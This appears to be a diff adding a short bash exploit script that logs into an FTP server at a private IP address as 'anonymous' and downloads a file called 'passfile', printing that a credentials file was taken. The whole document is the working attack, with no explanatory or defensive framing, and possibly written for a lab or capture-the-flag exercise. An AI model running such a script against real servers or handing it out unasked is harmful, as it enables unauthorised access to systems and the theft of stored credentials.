@@ -1,0 +1,15 @@
+#!/bin/bash
+
+#FTP details
+FTP_SERVER="10.252.41.120"
+FILE_TO_DOWNLOAD="passfile"
+
+#Circumvent manual login with -inv
+ftp -inv $FTP_SERVER <<EOF
+user anonymous ""
+get $FILE_TO_DOWNLOAD
+bye
+EOF
+
+echo "Download of $FILE_TO_DOWNLOAD completed."
+echo "Exploit completed - creds file downloaded."
